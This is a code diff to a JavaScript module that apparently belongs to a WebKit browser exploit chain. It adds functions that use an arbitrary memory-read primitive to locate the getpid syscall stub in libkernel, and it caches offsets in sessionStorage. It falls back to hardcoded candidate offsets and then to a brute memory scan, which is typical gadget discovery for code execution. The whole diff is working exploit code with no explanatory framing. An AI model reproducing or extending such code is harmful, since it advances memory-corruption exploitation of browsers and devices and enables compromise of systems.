@@ -168,6 +168,98 @@ export function isGetpidStub(v) {
     return isSyscallStub(v, 20);
 }
 
+const SS_LAST_FN = "wk-lastFnPtr";
+const SS_GETPID_STUB = "wk-getpidStubOff";
+
+export function saveLastFnPtr(fnPtr) {
+    try {
+        if (fnPtr) sessionStorage.setItem(SS_LAST_FN, String(fnPtr));
+    } catch (_) { }
+}
+
+export function loadLastFnPtr() {
+    try {
+        const raw = sessionStorage.getItem(SS_LAST_FN);
+        if (raw) return parseAddrSync(raw);
+    } catch (_) { }
+    return null;
+}
+
+function saveGetpidStubOff(off) {
+    try {
+        if (off != null) sessionStorage.setItem(SS_GETPID_STUB, off.toString(16));
+    } catch (_) { }
+}
+
+function loadGetpidStubOff() {
+    try {
+        const n = parseInt(sessionStorage.getItem(SS_GETPID_STUB), 16);
+        return n > 0 ? n : null;
+    } catch (_) {
+        return null;
+    }
+}
+
+/** Verified getpid syscall stub — fn+delta, lk+off, or scan. Never blind. */
+export function resolveGetpidStub(p, lk, off, opts) {
+    opts = opts || {};
+    if (!p || !lk)
+        return { verified: false, tag: "no-lk", addr: null, off: null };
+
+    function tryAt(addr, tag) {
+        if (!addr) return null;
+        const v = read8p(p, addr);
+        if (!v || !isGetpidStub(v)) return null;
+        return { addr, tag, verified: true };
+    }
+
+    const cached = loadGetpidStubOff();
+    if (cached != null) {
+        const hit = tryAt(lk.add32(cached), "cached+0x" + cached.toString(16));
+        if (hit) {
+            hit.off = cached;
+            return hit;
+        }
+    }
+
+    const fnPtr = opts.fnPtr || loadLastFnPtr();
+    if (fnPtr && off.k_usleep != null && off.k_stubs && off.k_stubs[20] != null) {
+        const delta = (off.k_stubs[20] - off.k_usleep) >>> 0;
+        const hit = tryAt(fnPtr.add32(delta), "fn+delta");
+        if (hit) {
+            hit.off = cached != null ? cached : off.k_stubs[20];
+            saveGetpidStubOff(off.k_stubs[20]);
+            return hit;
+        }
+    }
+
+    const offs = getpidStubOffsets(off);
+    for (let i = 0; i < offs.length; i++) {
+        const o = offs[i];
+        const hit = tryAt(lk.add32(o), "lk+0x" + o.toString(16));
+        if (hit) {
+            hit.off = o;
+            saveGetpidStubOff(o);
+            return hit;
+        }
+    }
+
+    const scanMax = opts.scanMax != null ? opts.scanMax : 0x40000;
+    const maxProbes = opts.maxProbes != null ? opts.maxProbes : 4096;
+    let probes = 0;
+    for (let o = 0; o < scanMax && probes < maxProbes; o += 16) {
+        probes++;
+        const hit = tryAt(lk.add32(o), "scan+0x" + o.toString(16));
+        if (hit) {
+            hit.off = o;
+            saveGetpidStubOff(o);
+            return hit;
+        }
+    }
+
+    return { verified: false, tag: "miss", addr: null, off: null, probes };
+}
+
 const GETPID_STUB_CANDS = [
     0x2cb70, 0x2d5e0, 0x2cb80, 0x2cc00, 0x28000, 0x29000, 0x2a000, 0x2b000,
     0x30000, 0x31000, 0x32000, 0x25000, 0x26000,
